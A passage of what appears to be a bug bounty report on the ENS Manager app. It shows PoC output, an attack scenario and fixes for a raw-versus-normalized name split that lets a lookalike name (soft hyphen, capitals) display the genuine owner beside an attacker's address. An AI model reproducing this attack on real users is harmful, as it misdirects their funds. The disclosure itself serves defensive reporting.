  mainAddress ? `coinType ${mainAddress.coinType} = ${mainAddress.value}` : '(none)')

const eth = records?.coins?.find((c) => c.coinType === 60)
console.log('\n=== RESULT ===')
console.log('victim EOA        :', victim.address)
console.log('attacker EOA      :', attacker.address)
console.log('displayed owner   :', owner?.owner ?? owner)
console.log('displayed ETH addr:', eth ? eth.value : '(none)')
console.log('copied from the Addresses card (ProfileAddressesSection.tsx:90-94, :159, :171-178):',
  mainAddress?.value)
console.log('\nThe profile shows the genuine owner next to an address the attacker chose.')
```

### Observed output

Abridged, from an anvil fork of Sepolia, chain id 11155111:

```
=== [0] raw vs normalize: which forms diverge, measured with the repo-pinned viem ===
  ASCII capital        normalize -> "victim.eth"   divergent: true  packetToBytes(raw) = 0x0656696374696d0365746800
  ASCII all-caps       normalize -> "victim.eth"   divergent: true  packetToBytes(raw) = 0x0656494354494d0345544800
  fullwidth  U+FF56    normalize -> "victim.eth"   divergent: true  packetToBytes(raw) = 0x08efbd96696374696d0365746800
  circled    U+24E5    normalize -> "victim.eth"   divergent: true  packetToBytes(raw) = 0x08e293a5696374696d0365746800
  Kelvin     U+212A    normalize -> "kelvin.eth"   divergent: true  packetToBytes(raw) = 0x08e284aa656c76696e0365746800
  soft hyphen U+00AD   normalize -> "victim.eth"   divergent: true  packetToBytes(raw) = 0x0876696374696dc2ad0365746800
  ZWSP       U+200B    normalize -> "victim.eth"   divergent: true  packetToBytes(raw) = 0x0976696374696de2808b0365746800
  word-joiner U+2060   normalize -> "victim.eth"   divergent: true  packetToBytes(raw) = 0x0976696374696de281a00365746800
  BOM        U+FEFF    normalize -> "victim.eth"   divergent: true  packetToBytes(raw) = 0x0976696374696defbbbf0365746800
  VS16       U+FE0F    normalize -> "victim.eth"   divergent: true  packetToBytes(raw) = 0x0976696374696defb88f0365746800
  ZWNJ       U+200C    normalize THROWS -> not usable
  ZWJ        U+200D    normalize THROWS -> not usable
  LRM        U+200E    normalize THROWS -> not usable
  CGJ        U+034F    normalize THROWS -> not usable

=== [1] the two names, and the hostile resolver ===
  genuine  : "nickdemo539972.eth"          labelhash 0xa853ae54...92bbccad
  impostor : "nickdemo539972<U+00AD>.eth"  labelhash 0xed0522cc...c4a88ee6
  normalize(impostor) -> "nickdemo539972.eth"
  hostile resolver    : 0x09f75f44a628b2f2798095a7e4454acb631e1e59

=== [2] registrations, through the real ETHRegistrar on the fork ===
  [2a] genuine  -> VICTIM,   resolver = the stock public resolver
  [2b] impostor -> ATTACKER, resolver = the hostile wildcard resolver

=== [3] the two reads the profile route performs for /nickdemo539972<U+00AD>.eth ===
  owner   (normalized -> "nickdemo539972.eth"):   0x70997970C51812dc3A010C7d01b50e0d17dc79C8  <- victim
  owner   (raw        -> "nickdemo539972<U+00AD>.eth"): 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266  <- attacker
  records (raw):
    coins: [{ coinType: 60, symbol: "eth", value: "0x00000000000000000000000000000000DeaDBeef" }]
    texts: [{ key: "avatar", value: "evil-text" }, { key: "url", value: "evil-text" }]
    resolverAddress: 0x09F75F44A628B2F2798095A7e4454AcB631E1E59                 <- attacker's resolver

=== [4] app-shaped read (profileRecords.ts:122-132) ===
  texts requested : 26  coins requested: 148
  resolverAddress : 0x09F75F44A628B2F2798095A7e4454AcB631E1E59
  getMainReceivingAddress (ProfileView.helpers.ts:239-244) -> coinType 60 = 0x00000000000000000000000000000000DeaDBeef

=== RESULT ===
displayed owner   : 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
displayed ETH addr: 0x00000000000000000000000000000000DeaDBeef
```

Step `[2]` is the executed evidence for the attack's one precondition. The registrar's `register(label, owner, secret, subregistry, resolver, duration, paymentToken, referrer)` takes the label string verbatim, with no ENSIP-15 anywhere in that path, so a label that `normalize()` would fold away registers exactly as written and produces a distinct node. In a separate run on the same fork I also confirmed that `owner` is a free parameter of `register()`: the caller pays and names any address as owner. That property is not needed for this attack, since the attacker keeps the twin, but it shows the registrar applies no name policy of any kind.

U+00AD SOFT HYPHEN is zero-width when rendered as text, so `nickdemo539972<U+00AD>.eth` reads as the real name wherever the app prints it: the browser tab title (`routes/$name/index.tsx:131-141` builds the `<title>` from the raw param) and the `<h1>` on the profile itself (`ProfileDetails.tsx:22-28` renders `{name}` at `:25`, fed the raw route param through `ProfileHeader.tsx:51`).

I have not tested how a browser address bar renders it, and I would not be surprised if Chrome shows `%C2%AD` there. I am not claiming the URL bar. The finding does not need it: the victim arrives by clicking a link, and it is the page that lies to them. The divergence measured in step `[0]` applies here too, since `Victim.eth` produces the same two-node split with no invisible character at all.

### What the PoC covers and what it does not

`poc.mjs` drives `@ensdomains/ensjs` directly. It does not boot the Vite app and it does not import `getProfileRecords` itself, because that function first queries the GraphQL indexer at `profileRecords.ts:94-97`, and the indexer is out of scope and not available offline.

Step `[4]` closes as much of that gap as possible without the app running. It reproduces `profileRecords.ts:109-132` argument for argument: the same `texts` union (the nine `staticTextRecords` from `data/records/text.tsx:31-41` plus the seventeen `textRecords` keys from `:43-220`; the two `forceFetchRecords` spreads at `profileRecords.ts:112-113` are rebuilt from those same two lists at `data/records/utils.ts:32-40`, so they add no key the union does not already have), the same `coins` union (`alwaysProbeAddressRecords` plus `addressRecords`, rebuilt from the same `@ensdomains/address-encoder` `coinTypeToNameMap` that `data/records/address.tsx:5-11` builds it from, filtered by `isSupportedCoinType`), and the same options object `{ contentHash: true, abi: true, ignoreInvalidCoinTypes: true }`. It then applies the selection rule from `getMainAddressCandidate` (`ProfileView.helpers.ts:229-237`). 26 texts and 148 coins go out, and coinType 60 comes back as the attacker's address.

Still inferred rather than executed:

* The React render of the poisoned value into the `CopyableButton`. That path is `ProfileAddressesSection.tsx:159` then `:171-178` then `:90-94`, a straight prop pass with no filtering, but I did not run it in a browser and will not claim I did. A triager can close it in a few minutes: run `pnpm dev` in `apps/manager` against the same fork, open `/<base><U+00AD>.eth`, and read the Addresses card.
* The indexer leg. It can only add keys to the two unions and cannot remove coinType 60, which `data/records/utils.ts:42` pins unconditionally.
* The Edit Profile write path described at the end of this report.

One dependency worth naming rather than letting a triager find it. `getProfileRecords` does not merely consult the indexer, it fails if the indexer query errors: `fetchIndexerDomain` rethrows at `profileRecords.ts:52` and `:53`, and `:94-97` lifts that into the Result, so an indexer error aborts the read and the route renders its error component instead of a poisoned profile. It queries by the raw name (`profileRecords.ts:49`, `{ id: name }`), and a GraphQL lookup for an id the indexer has never seen normally returns `{ domain: null }` rather than an error, after which `indexerDomain.domain?.resolver` is undefined and the unions fall back to exactly the static sets step `[4]` uses. That is the expectation the attack rests on and it is consistent with the code, but the indexer is out of scope and I could not execute it, so I state it as reasoning rather than measurement. Either way, the service-level split at `profileRecords.ts:124` is unaffected.

I registered the twin with U+00AD. I measured the case, fullwidth, circled and Kelvin divergences in step `[0]` but did not register a separate name for each of them.

## Attack scenario

1. The attacker registers `victim<U+00AD>.eth`. The registrar applies no ENSIP-15 normalization, so this succeeds. This step is executed in the PoC at `[2b]`.
2. They point it at a wildcard resolver that answers every `addr()` with their own address.
3. They share `app.ens.domains/victim<U+00AD>.eth`, or the app's own share URL `app.ens.domains/p/victim<U+00AD>.eth`, which redirects to it unchanged (`routes/p/$name/index.tsx:9`). A forum post, a DM or an invoice all work.
4. A counterparty opens it, sees the genuine owner, the genuine registration date and the genuine expiry, and copies the receiving address from the Addresses card.
5. Funds go to the attacker.

The person being defrauded never connects a wallet, signs anything or does anything unusual. Opening a profile link is the app's normal workflow.

## Relationship to the known issues list

The closest known entry is EXP-INPUT-005, which describes name validators accepting inputs that ENS normalization later rejects or transforms, including homoglyphs, bidirectional and other control characters, and a single leading or trailing dot. It rates that Medium and describes the practical impact as homograph-style display confusion in the UI rather than incorrect resolution. The duplicate rule is strict: same root cause is a duplicate even with a different exploitation path or entry point. So the question is not whether my entry point differs, it is whether the root cause is the same. I do not believe it is, for three reasons.

First, the divergence does not need any character EXP-INPUT-005 enumerates. Step `[0]` is that measurement, taken with the repo-pinned viem. `normalize('Victim.eth') === 'victim.eth'` while `namehash('Victim.eth') !== namehash('victim.eth')`, and `packetToBytes('Victim.eth')` preserves the capital V byte for byte (`0x0656696374696d0365746800`, where `0x56` is `V`). The same holds for `VICTIM.ETH`, for fullwidth `ｖictim.eth` (U+FF56), for circled `ⓥictim.eth` (U+24E5) and for Kelvin `Kelvin.eth` (U+212A). Plain ASCII capitalisation is not a homoglyph, not a bidirectional or other control character, and not a leading or trailing dot. The divergence is a property of `normalize()` against `packetToBytes()`, not a property of any character class. A validator written to the scope EXP-INPUT-005 states would leave `Victim.eth` untouched and this route would still fire.

Second, the root cause sits in a different place. EXP-INPUT-005 is about what a validator accepts at the door. This finding is about what the services do with a name they have already accepted: `profileOwner.ts:25` normalizes, `profileRecords.ts:124` does not, and resolver discovery and the ownership read address two different nodes. Those are two different defects in two different files. The evidence that they are separable is that `profileRecordsQuery` is consumed from ten other call sites that never pass through the `$name` route's parameter guard: the dashboard (`DashboardPage.tsx:62`, `MyNamesList.tsx:257`, `ChoosePrimaryNameDialog.tsx:396`), the landing page (`CheckAvailability.tsx:76`), the app shell (`Layout.tsx:30`), bulk renew (`useBulkRenew.ts:189`), the connected-wallet avatar (`useConnectedAvatar.ts:11`), the image cache (`profileImageCache.ts:114`), and the address profile views (`AddressProfileHeader.tsx:89`, `AddressProfileNamesList.tsx:210`). A route-level validator fixes the route. It does not fix the service.

Third, EXP-INPUT-005 rules this impact out in its own words: display confusion rather than incorrect resolution. This is incorrect resolution. Two different ENS nodes are resolved on one screen and the address the user copies comes from the attacker's.

To be fair to the entry, the Explorer's existing `isValidEnsName` does reject `Victim.eth`, since it demands `ens_normalize(label) === label`. If the shipped Manager fix turns out to be a copy of that function, it would incidentally block this route's entry point. It would still leave the service-level split in place for the ten callers above.

And if a triager still reads the two root causes as one, the known-issues doc states that anything not listed is in scope, including new consequences of a listed root cause that materially change its severity. EXP-INPUT-005 is Medium and scoped to display confusion. This is the program's own Critical example, an ENS name resolved and rendered to an attacker-controlled address, with a PoC. Medium display confusion to Critical funds misdirection is as material a severity change as that clause can describe.

I checked the rest of the list as well. This is not SEC-MGR-003, 008, 010 or 011, not SEC-TXM-002, not EXP-4337-002 or 003, not EXP-INPUT-003, 008 or 009, not EXP-GAP-006, not R2-01 through 06, not R3-01 through 08, and not any QA or tracker item.

The nearest tracker item is worth naming so nobody has to go looking for it. WEB-1301 says the address view displays owner, registered and expires values taken from the wallet's primary name, which is misleading in an address context. That is a different route (`/$address`, not `/$name`), a different mechanism (one name's data shown under an address heading, with no second name involved and nothing an attacker supplies), and a different impact (misleading rather than attacker-chosen). It is not this.

For prior art outside the program: the target repository has issues disabled, `gh pr list --state all` returns nothing, the upstream monorepo is private, and I found no public advisory describing this. The general shape, normalize for display and resolve on the raw string, is a recognised hazard in ENS integration work rather than a category I am inventing, and I mention that only so the class does not read as a nitpick. I found no public write-up of this application's instance of it.

## A note on the testnet pin

The Manager is currently chain-pinned to Sepolia, so no mainnet funds are at risk from this deployment today. I am flagging that rather than leaving it for triage to discover. It does not change the finding: the impact as the program describes it is about the application displaying an incorrect address, which is demonstrated here; the chain pin is deployment configuration, not a control; and the defective code is chain-agnostic and ships unchanged to whatever chain is configured.

## Additional observation: the Edit Profile write path

This part is traced in source, not executed, and it is not in the PoC. I include it because it is the same split with a worse landing point. Treat it as a lead attached to a confirmed finding, not as a second confirmed finding.

On the twin's page, `ProfileView.tsx:115` takes `owner` from the normalized read and `ProfileView.tsx:119` derives `isOwner` from it (`useIsOwner`, `ProfileView.tsx:47-58`). So when the victim opens their own twin's URL with their wallet connected, `isOwner` is true, because the normalized node really is theirs. `ProfileActions.tsx:107-119` then renders `ProfileEditAction`, which bails out at `ProfileEditAction.tsx:35` on `!isOwner || isInGrace || isUnmigratedEthName`. None of the three holds: `isOwner` came from the normalized read, the twin is freshly registered so it is not in grace, and `isUnmigratedEthName` (`:32-33`) needs `protocol === 'v1'` while the twin is a v2 name. So it falls through and mounts `EditProfileDialog` with `records`, the raw read, at `ProfileEditAction.tsx:44-50`.

Those records carry the attacker's resolver. `profileRecords.ts:137` sets `resolverAddress` from the raw `getRecords` result, `transformRecords.ts:176` copies it into the `ProfileRecords` shape (`features/profile/types.ts:43`), and from there it flows `EditProfileDialog.tsx:69` to `EditProfileDialog.machine.ts:191` (`resolverAddress: savedRecords.resolverAddress`) to `profileRecordTransactions.ts:455`:

```ts
return {
  calls: [{ to: resolverAddress, data, value: 0n }],
```

So the transaction the victim is asked to sign is addressed to a contract the attacker deployed. The only thing between that and the wallet prompt is the write-access probe in `resolverWriteAccess.ts`. At `:73` it snapshots the resolver by calling `getProfileEthAddressSnapshot(name)` with the raw name and no resolver override, which is itself another `getRecords(client, { name, ... })` (`profileEthAddress.ts:29-49`, the override at `:40-46` left unset). At `:46-54` it does a single `publicClient.call({ account: ownerAddress, to: resolverAddress, data })`, treating a revert as not writable (`:56-64`) and anything else as writable. A hostile resolver that simply does not revert passes it. `useEditProfileDialogSave.ts:216` and `:219-226` are where that probe gates the flow.

If that holds when executed, it maps to the program's other Critical impact around malicious interactions with an already-connected wallet, specifically substituting contract addresses and submitting malicious transactions. I did not execute it, so I am not claiming it. The Critical I am claiming is the read-side one, which is demonstrated.

## Remediation

**1. Make the two reads address one node.** This is the actual fix. Derive the name once and pass the same derived value to both legs, or pass an explicit `resolver` override to `getRecords` so record reads use the resolver of the node the ownership read used:

```ts
// profileRecords.ts:122-132: resolve the name form once, up front, and use only that
const resolvedName =
  normalizeEthName(name)?.name ?? normalizeDnsName(name)   // profileName.ts:14, :44
if (!resolvedName) return err(...)                         // do not fall back to `name`
getRecords(client, { name: resolvedName, texts, coins, ... })
```

The fallback matters. `normalizeEthName` returns null for a non-`.eth` name (`profileName.ts:26-33`), so `normalizeEthName(name)?.name ?? name` would quietly reinstate the raw read for imported DNS names. Fail closed instead.

Do this in the service, not only in the route, because `profileRecordsQuery` has ten other callers that never touch the `$name` parameter guard.

**2. Add a resolver-consistency assertion.** When `records.resolverAddress` (`profileRecords.ts:137`) is not the resolver registered for the normalized node, refuse to render records rather than displaying them beside the normalized owner. This would have contained the finding even with the route bug present, and it also contains the Edit Profile path, which reads its target resolver from the same field.

**3. Canonicalize the URL.** In the `$name` loader (`routes/$name/index.tsx:50`), if `normalize(param) !== param`, `redirect()` to the normalized path, so the address bar, the `<title>` at `:131-141`, every read and every rendered value agree on one form of the name. If `normalize` throws, render an invalid-name state.

**4. Validate the input, but do not stop there.** Gate the route on an ENSIP-15 check. The Explorer's `isValidEnsName` (`apps/portal/src/utils/token/isNormalized.ts:39-57`) is a ready-made implementation already in this repository. I list this fourth deliberately. A validator written to the scope EXP-INPUT-005 describes (homoglyphs, bidi and control characters, a leading or trailing dot) does not reject `Victim.eth`, and even a strict one leaves the raw against normalized split intact in `profileRecords.ts` for its other ten callers. A validator alone does not close this.
